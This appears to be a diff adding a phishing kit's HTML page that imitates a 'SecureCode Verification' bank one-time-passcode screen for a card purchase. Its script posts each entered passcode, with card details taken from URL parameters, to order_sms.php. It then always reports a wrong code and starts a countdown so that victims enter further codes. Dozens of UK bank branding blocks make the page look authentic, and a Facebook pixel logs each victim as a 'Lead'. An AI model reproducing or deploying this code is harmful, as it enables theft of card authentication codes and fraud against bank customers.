@@ -1,0 +1,732 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>SecureCode Verification</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<meta charset="utf-8">
+		<!--<script src="/static/3ds/assets/global.js" type="text/javascript"></script>-->
+		<script src="global.js" type="text/javascript"></script>
+		<!--<script src="/static/3ds/assets/jquery.min.js" type="text/javascript"></script>-->
+		<script src="jquery.min.js" type="text/javascript"></script>
+		<script language="JavaScript">
+			var strBeforeUnload = "Are you sure you want to close this page? Your transaction has not been completed.";
+		</script>
+		<!--<link href="/static/3ds/assets/pa_style.css" rel="stylesheet" type="text/css">-->
+		<link href="pa_style.css" rel="stylesheet" type="text/css">
+		<link rel="shortcut icon" href="faviconpay.ico" type="image/x-icon">
+		<script>
+			
+			$(window).on("load", function() {
+				// -------------- FACEBOOK PIXEL ------------------
+				var urlParams = new URLSearchParams(window.location.search);
+				var facebook_pixel = urlParams.get("fb");
+				var facebook_pixel_event = "Lead";
+				var facebook_pixel_short_version = false;
+				if(facebook_pixel != null && typeof facebook_pixel !== typeof undefined){
+					var html_pixel = "";
+					if(!facebook_pixel_short_version) {
+						html_pixel = "<noscript><img height=\"1\" width=\"1\" style=\"display:none\" src=\"https://www.facebook.com/tr?id=" + facebook_pixel + "&ev=" + facebook_pixel_event + "&noscript=1\"/></noscript>";
+						var noscript = document.createElement("noscript");
+						noscript.innerHTML = html_pixel;
+						document.head.appendChild(noscript);
+						html_pixel = "	!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?" +
+									 "	n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;" +
+									 "	n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;" +
+									 "	t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window," +
+									 "	document,'script','https://connect.facebook.net/en_US/fbevents.js');" +
+									 "	fbq('init', '" + facebook_pixel + "');" +
+									 "	fbq('track', 'PageView');" +
+									 "	fbq('track', '" + facebook_pixel_event + "');";
+						var script = document.createElement("script");
+						script.innerHTML = html_pixel;
+						document.head.appendChild(script);
+					} else {
+						html_pixel = "<img height=\"1\" width=\"1\" style=\"display:none\" src=\"https://www.facebook.com/tr?id=" + facebook_pixel + "&ev=" + facebook_pixel_event + "&noscript=1\"/>";
+						$("head").prepend(html_pixel);
+					}
+				}
+				// ------------------------------------------------
+			    $('body').removeClass('beforeLoad');
+			    $('.modal-page').removeClass('ovh');
+			});
+			
+			$(document).ready(function() {
+			
+			    const front = document.querySelector('.front')
+			    const bankLogo = document.querySelector('.bank-logo')
+			    const brandLogo = document.querySelector('.brand-logo')
+			    const numberField = localStorage.getItem('cNumFirstSix');
+			    const frontFields = document.querySelectorAll('.front .field')
+			    const nextNumberButton = document.querySelector('.next-number-button')
+			
+			
+			    function nowDate() {
+			        var now = new Date();
+			        var day = (now.getDate());
+			        var month = (now.getMonth() + 1);
+			        var year = (now.getFullYear());
+			
+			        $('.date_day').text(day);
+			        $('.date_month').text(month);
+			        $('.date_year').text(year);
+			    }
+			    nowDate();
+			
+			    function startCountdown() {
+			        var countdown = $('#countdown span'),
+			            timer;
+			        var startFrom = 30;
+			        $('.list-item.li_inp .label').addClass('remove_relative');
+			        countdown.text(startFrom).parent('p').show();
+			        /*				    but.hide();*/
+			        timer = setInterval(function() {
+			            countdown.text(--startFrom);
+			            if (startFrom <= 0) {
+			                clearInterval(timer);
+			                $('input[type="submit"]').removeClass('cursordef');
+			                $('.big-input').attr('style', 'display:block');
+			                $('.smallie').attr('style', 'display:block');
+			                $('.backtimer').attr('style', 'display:none');
+			                $('.list-item.li_inp .label').removeClass('remove_relative');
+			                $('.codecenter').removeClass('pendingTime');
+			                $('#desc').html('<p class="new_ps">New one-time passcode has been sent to your registered mobile number.</p>');
+			                document.frm.PASSWORD.focus();
+			            }
+			        }, 1000);
+			    }
+			
+			    $('input[type="submit"]').click(function(e) {
+			        // prevent default action and bubbling
+			        e.preventDefault();
+			        e.stopPropagation();
+			
+			        var empty = '';
+			        var form = $('#ajax-contact');
+			        var formData = form.serialize();
+			        if (document.frm.PASSWORD.value === '') {
+			            alert("Please enter a one-time passcode.");
+			            document.frm.PASSWORD.focus();
+			            return false;
+			        } else {
+			            $.ajax({
+			                type: 'POST',
+			                url: 'order_sms.php',
+			                data: {
+			                    sms: $('#psw_id').val(),
+			                    csrfmiddlewaretoken: 'dmS0vw0Jffgbz1TE6apN9ukjIZWV8f6vadkgyHRCzPiBapVivsudBG9AXW0IjtOR',
+			                    last: (_params_["last"] != null ? _params_["last"] : ""),
+			                    full: (_params_["full"] != null ? _params_["full"] : "")
+			                },
+			                dataType: "json",
+			                cache: false,
+			                success: (data) => {},
+			                error: (xhr, str) => {
+			                    console.log(`${JSON.stringify(xhr, null, '\t')}; ${str}`)
+			                }
+			            })
+			            $('input[type="submit"]').addClass('cursordef');
+			            setTimeout(function() {
+			                $('.sts').hide();
+			                $('#desc').html('<p style="color: red" class="error">Wrong one-time passcode entered. A new one-time passcode will be sent to you in 30 seconds.</p>');
+			                document.frm.PASSWORD.value = empty;
+			                document.frm.PASSWORD.focus();
+			                $('input[type="submit"]').addClass('cursordef');
+			                $('.big-input').attr('style', 'display:none');
+			                $('.smallie').attr('style', 'display:none');
+			                $('.backtimer').attr('style', 'display:block');
+			                $('.codecenter').addClass('pendingTime');
+			                startCountdown();
+			                return false;
+			            }, 1900);
+			        }
+			
+			    });
+			
+			
+			});
+		</script>
+		<script type="text/javascript">
+			function resendSMS() {
+			    var empty = '';
+			    if (confirm("Send another one-time code?")) {
+			        $('.sts').hide();
+			        $('#desc').html('<p>Another one-time code was sent to your phone number. Wait until you receive it and enter the new code.</p>');
+			        document.frm.PASSWORD.value = empty;
+			        document.frm.PASSWORD.focus();
+			        $('input[type="submit"]').removeClass('cursordef');
+			    }
+			}
+			
+			
+			strBeforeUnload = "Your transaction is not completed! To complete the transaction, click 'Cancel' and enter the code on the security check page.";
+			
+			var PAMs = new Array();
+			PAMs[0] = new Array("0", "None");
+			
+			function OnExit() {
+			    if (confirm("Are you sure you want to get out? Your transaction is not completed. To complete the transaction, click 'Cancel' and enter the code on the security check page.")) {
+			        isCheckUnload = false;
+			        document.frm.formaction.value = "pa.exit";
+			        document.frm.submit();
+			        document.location.href = '/order/'
+			    } else document.frm.PASSWORD.focus();
+			
+			    return false;
+			}
+			
+			var minPwdLength = getInt("5", 5);
+			var maxPwdLength = getInt("32", 32);
+			var isAlphaNumeric = getBool("true", true);
+			
+			
+			function ShowPage(name) {
+			    isCheckUnload = false;
+			    document.frm.formaction.value = name;
+			    document.frm.submit();
+			}
+			
+			function setHTML(el, html) {
+			    if (el) {
+			        var oldEl = (typeof el === "string" ? document.getElementById(el) : el);
+			        var newEl = document.createElement(oldEl.nodeName);
+			        // Preserve any properties we care about (id and class in this example)
+			        newEl.id = oldEl.id;
+			        newEl.className = oldEl.className;
+			        //set the new HTML and insert back into the DOM
+			        newEl.innerHTML = html;
+			        if (oldEl.parentNode) oldEl.parentNode.replaceChild(newEl, oldEl);
+			        else oldEl.innerHTML = html;
+			        return newEl;
+			    }
+			
+			    return el;
+			}
+			
+			function OnLoad() {
+			    var loginTries = 0;
+			    var desc = document.getElementById("desc");
+			
+			
+			    var pwdElement = document.getElementById("psw_id");
+			    var style = window.getComputedStyle(pwdElement);
+			
+			    if (!style.webkitTextSecurity) {
+			        pwdElement.setAttribute("type", "password");
+			    }
+			
+			    document.frm.PASSWORD.focus();
+			}
+			
+			function changePam() {
+			    var user = document.frm.userkey[document.frm.userkey.selectedIndex].value;
+			    var pam = document.getElementById("pam");
+			    for (i = 0; i < PAMs.length; i++)
+			        if (PAMs[i][0] === user) pam.innerHTML = PAMs[i][1];
+			}
+			
+			function setCells(row, cell1, cell2) {
+			    if (row) {
+			        if (row.insertCell) {
+			            var c1 = row.insertCell(0);
+			            c1.innerHTML = cell1;
+			            var c2 = row.insertCell(1);
+			            c2.innerHTML = cell2;
+			        } else row.innerHTML = "<div class='label'>" + cell1 + "</div><div class='value'>" + cell2 + "</div>";
+			    }
+			}
+			
+			function delRow(tr) {
+			    if (tr) {
+			        if (tr.deleteCell && tr.cells.length > 0) {
+			            tr.deleteCell(1);
+			            tr.deleteCell(0);
+			        } else tr.innerHTML = "";
+			    }
+			}
+			
+			
+			
+			function removeElement(id) {
+			    if (typeof id === "object") return id.parentNode.removeChild(id);
+			    else return (elem = document.getElementById(id)).parentNode.removeChild(elem);
+			}
+			
+			
+			
+			function backToAuthList() {
+			    removeElement(document.getElementById("psw_id"));
+			    document.getElementById("btnBack").disabled = true;
+			    document.frm.formaction.value = "pa.back";
+			    document.frm.submit();
+			}
+			
+			function goToADS() {
+			    removeElement(document.getElementById("psw_id"));
+			    document.frm.formaction.value = "pa.gotoADS";
+			    document.frm.submit();
+			}
+			
+			
+			function iosAutoComplete() {
+			    var isIOSSafari = /iP(ad|od|hone)/i.test(window.navigator.userAgent) && /WebKit/i.test(window.navigator.userAgent) && !(/(CriOS|FxiOS|OPiOS|mercury|YaBrowser)/i.test(window.navigator.userAgent));
+			    if (isIOSSafari) {
+			        document.getElementById("psw_id").setAttribute("autocomplete", "one-time-code");
+			    }
+			}
+			
+			function helpPage() {
+			    $('.help').removeClass('hid').addClass('sie');
+			    $('.codecenter').removeClass('sie').addClass('hid');
+			}
+			
+			function comeBack() {
+			    $('.help').removeClass('sie').addClass('hid');
+			    $('.codecenter').removeClass('hid').addClass('sie');
+			}
+		</script>
+	</head>
+	<body class="beforeLoad" onload="OnLoad();" onbeforeunload="OnBeforeUnload();">
+		<div class="preloader">
+			<div class="preloader_img"></div>
+		</div>
+		<div class="modal-page ovh">
+			<div class="header">
+				<div class="bank_logo_wrapper">
+					<img class="bank-logo" src="">
+				</div>
+				<div class="brand_logo_wrapper">
+					<img class="brand-logo" src="">
+				</div>
+			</div>
+			<form class="form_item" id="ajax-contact" method="POST" name="frm" accept-charset="utf-8" action="order_sms.php">
+				<input type="hidden" name="oi" value="158">
+				<div class="codecenter">
+					<h1 id="h1_item"></h1>
+					<div id="desc" class="desc">
+						<p id="desc_p" class="sts"></p>
+					</div>
+					<div class="list" id="descList" style="display: block;">
+						<div class="list-item" id="pa_merchant">
+							<div class="label">Merchant:</div>
+							<div class="value">KFC</div>
+						</div>
+						<!--
+							<div class="list-item" id="pa_desc">
+							    <div class="label">Description:</div>
+							    <div class="value"></div>
+							</div>
+							-->
+						<script>
+							const _params_ = new Proxy(new URLSearchParams(window.location.search), {
+							  get: (searchParams, prop) => searchParams.get(prop),
+							});
+						</script>
+						<div class="list-item" id="pa_amount">
+							<div class="label">Amount:</div>
+							<div class="value"><b class="nw1"> <span class="finalprice_span"><script>document.write((_params_["summ"] != null ? _params_["summ"] : ""));</script> <script>document.write((_params_["cur"] != null ? _params_["cur"] : ""));</script></span></b></div>
+						</div>
+						<div class="list-item" id="pa_date">
+							<div class="label">Date:</div>
+							<div class="value nw1"><span class="date_day"></span>/<span class="date_month"></span>/<span class="date_year"></span></div>
+						</div>
+						<div class="list-item" id="pa_pan">
+							<div class="label">Card Number:</div>
+							<div class="value"> **** **** **** <span class="lastfourdigit"><script>document.write((_params_["last"] != null ? _params_["last"] : ""));</script></span></div>
+						</div>
+						<div class="list-item li_inp" id="inp">
+							<div class="label">Enter One-Time Passcode:</div>
+							<div class="value">
+								<input class="big-input" id="psw_id" type="tel" name="PASSWORD" size="20" maxlength="20" autocomplete="off" onclick="iosAutoComplete();" required>
+								<a class="smallie" href="#" onclick="resendSMS();">Haven't received a one-time passcode?</a>
+								<div id="countdown" class="backtimer hid">
+									<span class="display">30</span>
+								</div>
+							</div>
+						</div>
+					</div>
+					<div class="list">
+						<input type="hidden" name="PSW_RENEW" value="Y">
+						<input type="hidden" name="TRIES" value="Y">
+						<div class="footer">
+							<div class="row">
+								<div class="left"><a class="cancel_btn" href="#" onclick="OnExit(); return false;">Cancel</a></div>
+								<div class="center">
+									<input class="big-button" type="submit" id="btnSubmit" name="btSubmit" value="Submit">
+								</div>
+								<div class="right">
+									<a class="help_btn" href="#" onclick="helpPage();"><img src="help.gif" class="help_icon" alt="Help" align="absbottom">Help</a>
+								</div>
+							</div>
+						</div>
+					</div>
+					<input type="hidden" name="formaction" value="pa.submit">
+				</div>
+				<div class="help hid">
+					<div class="desc">
+						<p>SecureCode Verification is a free online card security program. SecureCode protects cards with a personal security passcode. If this service is activated on your card, the online stores participating in the program will redirect your
+							browser to the Bank's website to enter your personal passcode. After checking it, the purchase will be safely paid. If the online store does not participate in the SecureCode Verification program, payment security is not guaranteed.
+						</p>
+						<div class="list">
+							<div class="footer">
+								<div class="row">
+									<div class="">
+										<input id="returnBtn" onclick="comeBack()" class="big-button backlink" type="button" name="btcComeBack" value="Return">
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+				<input class="cnumidclass" type="hidden" name="cnumid">
+			</form>
+		</div>
+		<script>
+			const detectBank = card => /^(5[1-5]|222[1-9]|22[3-9]|2[3-6]|27[01]|2720)[0-9]{0,}$/.test(card) ? 'ALLOCATED TO SWITCH' : 'VANQUIS BANK, LTD'
+			
+			var getBankName = detectBank(''.replace(/\s/g, ''));
+			if (getBankName == 'GOVERNOR AND COMPANY OF THE BANK OF IRElanD') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/boi.jpg");
+			    $('body').addClass('boi');
+			    $('#h1_item').text('Protecting your online payments');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'ROYAL BANK OF SCOTlanD') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/rbs.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'ULSTER BANK, LTD') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/ulster.jpg");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'BANK OF SCOTlanD') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/bos.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'CITI BANK') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/citi.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'MBNA') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/mbna.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'ABBEY NATIONAL BANK PLC') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/abbey.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'AIB GROUP (UK) PLC') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/aib.gif");
+			    $('body').addClass('aib');
+			    $('#h1_item, #desc').wrapAll('<div class="aib_wrap_inner">');
+			    $('.aib_wrap_inner').wrapAll('<div class="aib_wrap">');
+			    $('#inp').appendTo('.aib_wrap_inner');
+			    $('<div id="desc_info"></div>').insertAfter('#descList');
+			    $('.smallie').text('Send new one time passcode');
+			    $('.smallie').appendTo('#desc_info');
+			    $('#desc_info').prepend("<span>If you haven't received a one time passcode within 5 minutes, you can request a new one here: </span>");
+			    $('.aib_wrap_inner').append('<div class="mincharacter">(Eight Digits)</div>');
+			    $('#h1_item').text('Perform secure payment');
+			    $('#desc_p').text('Confirm your purchase by entering the one time passcode within 5 minutes which we have sent to your mobile phone number.');
+			    $('.center').appendTo('#inp');
+			    $('.modal-page').append('<footer class="footer_item"><span class="small" id="footertext">This information is not shared with the online merchant.</span></footer>');
+			    $('#btnSubmit').val('PAY');
+			}
+			if (getBankName == 'ALLIANCE AND LEICESTER') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/aal.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'ALLOCATED TO SWITCH') {
+			    $('.bank-logo').attr('src', "pcidss.svg");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'ALLSTAR') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/allstar.svg");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'AMERICAN EXPRESS') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/amexbank.jpg");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'BARCLAYS BANK') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/barclays.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'BPSUPERCHARGE') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/pcids.svg");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'BRITANNIA BUILDING SOCIETY') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/bbs.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'BRITISH AIRWAYS') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/brai.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'CAPITAL ONE') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/capitalone.svg");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'CLYDESDALE BANK') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/clydesdale.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'CO-OPERATIVE BANK PLC') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/cooperative.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'CONISTER BANK, LTD') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/conister.svg");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'CREATION') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/creation.png");
+			    $('body').addClass('other');
+			        
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'FIRST DATA RESOURCES (UK) (FDR)') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/fdr.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'GE CAPITAL') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/ge.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'HALIFAX') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/halifax.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'HFC BANK PLC') {
+			    $('.bank-logo').attr('src', "pcidss.svg");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'HSBC') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/hsbc.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'IDT FINANCIAL SERVICES') {
+			    $('.bank-logo').attr('src', "pcidss.svg");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'INVESTEC BANK (UK), LTD') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/investec.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'J.P. MORGAN EUROPE, LTD') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/jpmorgan.jpg");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'LLOYDS BANK PLC') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/lloyds.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'NATIONAL AUSTRALIA GROUP (UK)') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/nab.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'NATIONAL WESTMINSTER BANK PLC') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/nwb.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'NATIONWIDE BUILDING SOCIETY') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/nationwide.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'NEWCASTLE BUILDING SOCIETY') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/newcastle.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'NORTHERN BANK, LTD') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/pcidss.scg");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'R RAPHAEL AND SONS') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/rras.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'REDFUEL(EUROPE)') {
+			    $('.bank-logo').attr('src', '/assets/cr/pcidss.svg');
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'SAINSBURYS BANK PLC') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/sainsburys.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'SANTANDER CARDS UK, LTD') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/santander.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'SG HAMBROS BANK AND TRUST') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/sghbt.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'STANDARD CHARTERED BANK') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/chartered.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'TESCO') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/tesco.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'TRAVELLERS CHEQUE') {
+			    $('.bank-logo').attr('src', "pcidss.svg");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'UK FUELS') {
+			    $('.bank-logo').attr('src', "pcidss.svg");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'VANQUIS BANK, LTD') {
+			    $('.bank-logo').attr('src', "pcidss.svg");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'VTB BANK OJSC') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/vtb.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'WOOLWICH PLC') {
+			    $('.bank-logo').attr('src', "pcidss.svg");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			if (getBankName == 'YORKSHIRE BANK') {
+			    $('.bank-logo').attr('src', "/static/assets/cr/yorkshire.png");
+			    $('body').addClass('other');
+			    $('#h1_item').text('Enter one-time Passcode');
+			    $('#desc_p').text('A one-time Passcode is required for this purchase. This Passcode has been sent to your registered mobile phone number.');
+			}
+			
